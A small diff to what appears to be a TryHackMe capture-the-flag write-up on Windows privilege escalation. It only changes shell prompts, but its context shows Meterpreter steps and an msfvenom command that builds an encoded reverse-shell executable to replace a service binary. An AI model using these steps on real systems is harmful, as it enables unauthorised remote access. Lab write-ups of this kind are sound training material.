@@ -80,7 +80,7 @@ we will use `PowerUp.ps1` to find a potential priv esc vector. `PowerUp` purpose
 
 let find out `PowerUP`:
 ```console
-kali@kali:~$ find / -name PowerUp.ps1 2> /dev/null
+bibo318@parrot:~$ find / -name PowerUp.ps1 2> /dev/null
 ```
 To execute this using Meterpreter, I will type ```load powershell``` into meterpreter to load the extension. Then enter powershell by execute ```powershell_shell``` then execute the script
 ```
@@ -116,7 +116,7 @@ note that we have premission to **restart** this service, moreover, the director
 
 now let create msfvenom reverse shell read [here](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/). We will replace the service which call ```ASCService.exe```, in Kali:
 ```console
-kali@kali:~/THM/steel$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.14.151 LPORT=6969 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+bibo318@parrot:~/THM/steel$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.14.151 LPORT=6969 -e x86/shikata_ga_nai -f exe -o ASCService.exe
 ```
 back to meterpreter. upload the shell
 ```
